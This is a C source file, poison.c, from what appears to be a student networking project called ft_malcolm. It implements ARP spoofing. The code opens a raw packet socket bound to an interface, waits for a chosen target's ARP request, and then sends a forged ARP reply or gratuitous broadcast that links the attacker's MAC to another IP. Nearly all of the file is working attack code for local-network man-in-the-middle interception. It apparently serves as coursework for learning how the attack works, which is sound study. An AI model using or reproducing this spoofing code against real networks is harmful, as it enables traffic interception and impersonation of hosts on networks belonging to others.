/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   poison.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: vgoncalv <vgoncalv@student.42sp.org.br>    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/06/21 16:21:24 by vgoncalv          #+#    #+#             */
/*   Updated: 2024/06/27 19:21:22 by vgoncalv         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_malcolm.h"
#include <errno.h>
#include <libft.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

t_poison	*poison_create(void)
{
	t_poison	*poison;

	poison = ft_calloc(1, sizeof(t_poison));
	if (poison == NULL)
	{
		error(strerror(errno));
		return (NULL);
	}
	poison->iface.sock_fd = -1;
	return (poison);
}

void	poison_destroy(t_poison *poison)
{
	if (poison->iface.sock_fd != -1)
		close(poison->iface.sock_fd);
	free(poison);
}

int	poison_bind_interface(t_poison *poison)
{
	struct ifreq	req;

	if (find_interface(&poison->iface) != 0)
		return (1);
	printf("Found interface: %s\n", poison->iface.name);
	poison->iface.sock_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (poison->iface.sock_fd == -1)
	{
		error("Failed to open socket: %s", strerror(errno));
		return (1);
	}
	printf("Opened socket: %d\n", poison->iface.sock_fd);
	ft_bzero(&req, sizeof(struct ifreq));
	ft_strlcpy(req.ifr_name, poison->iface.name, IFNAMSIZ);
	if (setsockopt(poison->iface.sock_fd, SOL_SOCKET, SO_BINDTODEVICE, &req, sizeof(req)) == -1)
	{
		error("Failed to bind socket to interface: %s", strerror(errno));
		return (1);
	}
	printf("Bound socket to the %s interface\n", poison->iface.name);
	return (0);
}


static int	is_poison_target(t_poison *poison, t_arp *packet)
{
	if (ft_memcmp(poison->target.mac, packet->ar_sha, ETHER_ADDR_LEN) != 0)
		return (0);
	if (poison->target.ip != packet->ar_spa)
		return (0);
	if (poison->source.ip != packet->ar_tpa)
		return (0);
	return (1);
}

int	poison_listen(t_poison *poison)
{
	ssize_t	read;
	t_arp	packet;

	ft_bzero(&packet, sizeof(t_arp));
	printf("Listening for ARP packets\n");
	while (1)
	{
		if (g_received_signal != 0)
			return (1);
		read = recvfrom(poison->iface.sock_fd, &packet, sizeof(t_arp), MSG_DONTWAIT, NULL, NULL);
		if (read == -1 && errno != EAGAIN && errno != EWOULDBLOCK)
		{
			error("Failed to read ARP packet: %s", strerror(errno));
			return (1);
		}
		if (read > 0 && is_arp_request(packet) && is_poison_target(poison, &packet))
		{
			printf("Received target ARP request\n");
			if (poison->verbose)
				print_arp_packet(packet);
			return (0);
		}
		usleep(100);
	}
}

int	poison_attack(t_poison *poison)
{
	int					res;
	struct sockaddr_ll	addr;
	t_arp				packet;

	if (poison->gratuitous)
		packet = create_gratuitous_arp_broadcast(&poison->source);
	else
		packet = create_arp_reply(&poison->source, &poison->target);
	ft_bzero(&addr, sizeof(struct sockaddr_ll));
	addr.sll_family = AF_PACKET;
	addr.sll_ifindex = poison->iface.index;
	addr.sll_halen = ETHER_ADDR_LEN;
	addr.sll_protocol = htons(ETH_P_ARP);
	ft_memcpy(addr.sll_addr, poison->target.mac, ETHER_ADDR_LEN);
	res = sendto(poison->iface.sock_fd, &packet, sizeof(t_arp), 0,
			  (struct sockaddr *)&addr, sizeof(struct sockaddr_ll));
	if (res == -1)
	{
		error("Failed to send ARP packet: %s", strerror(errno));
		return (1);
	}
	printf("Sent spoofed ARP reply\n");
	if (poison->verbose)
		print_arp_packet(packet);
	return (0);
}
